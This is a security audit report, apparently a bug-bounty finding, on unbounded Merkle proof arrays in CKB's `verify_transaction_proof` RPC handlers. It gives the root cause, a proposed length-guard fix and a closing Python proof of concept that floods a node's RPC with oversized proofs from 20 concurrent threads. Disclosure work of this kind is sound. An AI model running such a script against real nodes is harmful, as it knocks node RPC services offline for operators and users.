Audit Report

## Title
Unbounded Merkle Proof Iteration in `verify_transaction_proof` and `verify_transaction_and_witness_proof` Enables RPC CPU Exhaustion DoS - (File: `rpc/src/module/chain.rs`)

## Summary

The `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC handlers accept caller-supplied `lemmas` and `indices` arrays with no length validation before constructing `MerkleProof` objects and invoking `CBMT::retrieve_leaves` and `MerkleProof::root`. Each merge in `root` invokes a full blake2b hash via `MergeByte32::merge`. An attacker with RPC access can submit a crafted proof with a maximally-sized `lemmas` array (bounded only by the 10 MiB HTTP body limit, yielding ~149,000 lemmas), forcing O(N) synchronous blake2b operations per call and exhausting the RPC thread pool.

## Finding Description

**Root cause — no pre-check on proof array sizes:**

In `verify_transaction_proof` (L1948–1961), the handler directly collects caller-supplied `indices` and `lemmas` into unbounded `Vec`s and passes them to `MerkleProof::new` without any length validation:

```rust
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices.into_iter().map(|index| index.value()).collect(),
    tx_proof.proof.lemmas.into_iter().map(|lemma| lemma.into()).collect(),
);
CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
    .and_then(|tx_hashes| merkle_proof.root(&tx_hashes) ...)
``` [1](#0-0) 

The `MerkleProof` struct has no declared maximum on either field: [2](#0-1) 

Each merge in `root` calls `MergeByte32::merge`, which allocates a new blake2b context and performs a full hash: [3](#0-2) 

`verify_transaction_and_witness_proof` is worse: it constructs **two** unbounded `MerkleProof` objects and calls `retrieve_leaves` + `root` on each: [4](#0-3) 

**Existing guards and their insufficiency:**

The only size constraint is `max_request_body_size = 10485760` (10 MiB) in `resource/ckb.toml`: [5](#0-4) 

Each lemma is a 32-byte hash encoded as a 66-character hex string with JSON overhead (~70 bytes). At 10 MiB, an attacker can supply approximately **149,000 lemmas** per call — still a large number of blake2b operations. There is no per-call lemma count limit, no per-IP rate limit, and no cycle/time budget for proof verification in the handler code.

**Exploit path:**
1. Attacker obtains any valid block hash (trivially from `get_tip_header`).
2. Crafts a JSON-RPC call to `verify_transaction_proof` with `proof.indices: [0]` and `proof.lemmas` filled to the 10 MiB body limit (~149,000 entries).
3. Handler fetches the block (succeeds), allocates and iterates all lemmas via `.collect()`, then calls `retrieve_leaves` and `root`, performing O(N) blake2b operations synchronously on the RPC thread.
4. Repeated concurrent calls saturate the RPC thread pool, blocking all other RPC service.

**Note on uncertainty:** Whether `CBMT::retrieve_leaves` performs early validation of lemma count against tree structure (potentially short-circuiting before `root` is called) could not be verified without access to the `merkle_cbt` crate source. However, even if `root` is not reached, the `.collect()` calls unconditionally allocate and iterate all lemmas, constituting O(N) memory allocation work regardless.

## Impact Explanation

Saturating the RPC thread pool makes the node unresponsive to all RPC requests, including `send_transaction`, `get_block_template`, and monitoring endpoints. This maps to **"Note (0–500 points). Any local RPC API crash."** under the allowed impact scope. If the RPC port is exposed beyond localhost (explicitly warned against but practiced by some operators), the impact escalates toward **"High: Vulnerabilities which could easily crash a CKB node"** in terms of RPC service availability.

## Likelihood Explanation

By default, `listen_address = "127.0.0.1:8114"` restricts the RPC to localhost, significantly limiting remote exploitation. However, operators who expose the RPC publicly (common for infrastructure nodes) are fully exposed. No authentication is required. The only prerequisite is a valid block hash, trivially obtained from any public source. No on-chain funds, mining power, or special knowledge is needed. [6](#0-5) 

## Recommendation

Add a length guard at the entry point of both handlers before any computation, using the theoretical maximum lemma count for a valid CBMT proof (`ceil(log2(MAX_BLOCK_TRANSACTIONS))`):

```rust
fn verify_transaction_proof(&self, tx_proof: TransactionProof) -> Result<Vec<H256>> {
    const MAX_PROOF_LEMMAS: usize = 32; // ceil(log2(max block txs))
    if tx_proof.proof.lemmas.len() > MAX_PROOF_LEMMAS
        || tx_proof.proof.indices.len() > MAX_PROOF_LEMMAS
    {
        return Err(RPCError::invalid_params("proof exceeds maximum size"));
    }
    // ... existing logic
}
```

Apply the same guard to both `transactions_proof` and `witnesses_proof` in `verify_transaction_and_witness_proof`.

## Proof of Concept

```python
import json, requests, threading

block_hash = "0x7978ec7ce5b507cfb52e149e36b1a23f6062ed150503c85bbf825da3599095ed"
# ~149,000 lemmas to approach the 10 MiB body limit
lemmas = ["0x" + "aa" * 32] * 149_000

payload = {
    "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {"indices": ["0x0"], "lemmas": lemmas}
    }],
    "id": 1
}

def attack():
    requests.post("http://localhost:8114", json=payload)

# Concurrent calls to saturate the RPC thread pool
threads = [threading.Thread(target=attack) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

Each call forces O(N) memory allocation and potentially O(N) blake2b operations synchronously on an RPC thread. Concurrent calls exhaust the thread pool and block all other RPC service.
